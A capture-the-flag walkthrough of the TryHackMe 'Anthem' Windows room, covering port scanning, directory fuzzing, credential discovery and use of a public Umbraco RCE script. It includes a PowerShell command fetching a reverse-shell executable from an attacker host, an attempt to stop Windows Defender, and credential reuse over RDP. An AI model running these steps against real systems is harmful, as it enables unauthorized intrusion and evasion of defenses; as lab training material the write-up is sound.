```bash
# PLATFORM          . THM
# CTF NAME          . Anthem
# DESCRIPTION       . Exploit a Windows machine in this beginner level challenge.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/anthem
```

```bash
sudo nmap -sSVC -T5 -Pn -p- 10.10.254.142 -oN anthem
```

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-12-07T13:11:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-LU09299160F
| Not valid before: 2023-12-06T13:07:13
|_Not valid after:  2024-06-06T13:07:13
| rdp-ntlm-info: 
|   Target_Name: WIN-LU09299160F
|   NetBIOS_Domain_Name: WIN-LU09299160F
|   NetBIOS_Computer_Name: WIN-LU09299160F
|   DNS_Domain_Name: WIN-LU09299160F
|   DNS_Computer_Name: WIN-LU09299160F
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-07T13:10:32+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- By inspecting the source code, we can find the `/search`, `/categories`, `/tags` and `archive` directories.

- The `ffuf` command adds a few files/directories on this list

```
ffuf -u http://10.10.254.142/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt,.php -t 100
```

```
Archive                 [Status: 301, Size: 118, Words: 6, Lines: 4]
archive                 [Status: 301, Size: 118, Words: 6, Lines: 4]
authors                 [Status: 200, Size: 4075, Words: 769, Lines: 112]
blog                    [Status: 200, Size: 5399, Words: 1311, Lines: 127]
Blog                    [Status: 200, Size: 5399, Words: 1311, Lines: 127]
categories              [Status: 200, Size: 3546, Words: 561, Lines: 104]
install                 [Status: 302, Size: 126, Words: 6, Lines: 4]
robots.txt              [Status: 200, Size: 192, Words: 17, Lines: 11]
robots.txt              [Status: 200, Size: 192, Words: 17, Lines: 11]
rss                     [Status: 200, Size: 1855, Words: 240, Lines: 30]
search                  [Status: 200, Size: 3472, Words: 520, Lines: 93]
Search                  [Status: 200, Size: 3472, Words: 520, Lines: 93]
RSS                     [Status: 200, Size: 1855, Words: 240, Lines: 30]
sitemap                 [Status: 200, Size: 1047, Words: 94, Lines: 30]
SiteMap                 [Status: 200, Size: 1047, Words: 94, Lines: 30]
tags                    [Status: 200, Size: 3599, Words: 579, Lines: 105]
```

- Most of the pages are irelevant to us. However, if we read the first article on the blog, we can find an email address `JD@anthem.com` which is the address of the author, `Jane Doe`.

- This is important as it gives us the clear syntax used for email addresses.

- `Robots.txt` file reveals the following content

```
{redacted}!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```

- However, only `/umbraco` is relevant to us. 

- Here, the CTF holds our hand a bit and asks us about the Administrator username and email.

- To gather this, we need to head to the second article on the blog and search the lyrics of the poem on the internet. 

- This will reveal the name of the Administrator and, using the naming convention from above, his email address.

```
 S{REDACTED}y
 {redacted}@anthem.com
```

- Using the `email` and the string from `robots.txt`, `{redacted}!`, we're able to login to the `Umbraco CMS`.

- Alright. I was doing some overthinking here trying to get a reverse shell ; 

- I tried a bunch of RCE vulnerabilities from exploit-db targeting Umbraco ; most didn't work, two of them looked promising but outputted some python errors and I didn't wanted to spend time trying to fix them yet.

- Then, I've moved to metasploit and found a module which ... wasn't working on our Umbraco version.

- Finally, I found a vulnerability that allowed for RCE [here](https://github.com/noraj/Umbraco-RCE) and seemed to work, unlike its exploit-db counterparts.

- And here... I went down the loophole again. The syntax is

```
python3 exploit.py -u user -p psw -i 'http://ip' -c command -a args
```

```
python3 exploit.py -u <user> -p {redacted}! -i 'http://10.10.116.113' -c powershell -a "Invoke-WebRequest -Uri http://attacker_IP:80/rev_shell.exe -OutFile shell.exe"

Invoke-WebRequest : Access to the path 'C:\windows\system32\inetsrv\shell.exe' is denied.
```

- Using the command above, I tried transferring `rev_shell.exe` from my host, which is a reverse shell generated via msfvenom ;

- If you look to the output, it tried to write it to a path where we don't have write access.

- I assume all I had to do was to change `-OutFile` to `C:\Temp\shell.exe` or something similar .. but it didn't work :)

```
Error parsing the XSLT:System.Xml.Xsl.XslLoadException: Unrecognized escape sequence An error occurred at (1,107).
   at System.Xml.Xsl.XslCompiledTransform.LoadInternal(Object stylesheet, XsltSettings settings, XmlResolver stylesheetResolver)
   at umbraco.macro.CreateXsltTransform(XmlTextReader xslReader, Boolean debugMode)
   at umbraco.presentation.umbraco.developer.Xslt.xsltVisualize.visualizeDo_Click(Object sender, EventArgs e)
```

- However, my `python webserver` received a GET request, so I assumed this was because the script couldn't parse an output to return when the file transfer finished.

```
10.10.116.113 - [07/Dec/2023 23:38:54] "GET /rev_shell.exe HTTP/1.1" 200 
```

- I tried running the file... but with no luck. 

- Then, I tried different Powershell reverse shells until I got here.

```
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

- So yeah, "I'll just disable Windows defender" - I said :) 

```
python3 exploit.py -u <user> -p UmbracoIsTheBest! -i 'http://10.10.116.113' -c sc -a "stop windefend"

[SC] OpenService FAILED 5:

Access is denied.
```

- Ooops. Then.... I REMEMBERED SOMETHING. Look at the NMAP output.

- Did you see it? We have port 3389 open and I totally forgot about it. And yes... the credentials for the CMS work on RDP too.

```
xfreerdp /u:SG /v:10.10.116.113 /cert-ignore /dynamic-resolution 
```

- And we're in :) Not that hard... huh?

- The room guides us again and tells us that the Administrator password is available somewhere on the system and it's hidden.

- So I went to C:\ (wanted to go to Users -> Administrator) and then to `View -> Hidden items`. A folder `backups` appeard in the file explorer and it container a text file that couldn't be read by us.

- `Right Click, Properties, Security, Advanced` and assigned the file to my user, marking it with `Full Access`. 

- Then, you can switch to Administrator account with the password found.

**WEB FLAGS**

1. First blog post source code
2. Main page source code
3. Navigate to the profile of Jane Doe.
4. Second blog post source code

**TIP**: CTRL + F after THM to see them easier. I spent more time finding these without CTRL+F than anything else :) 

**HOST FLAGS**

1. User: User's desktop.
2. Root: Administrator's desktop.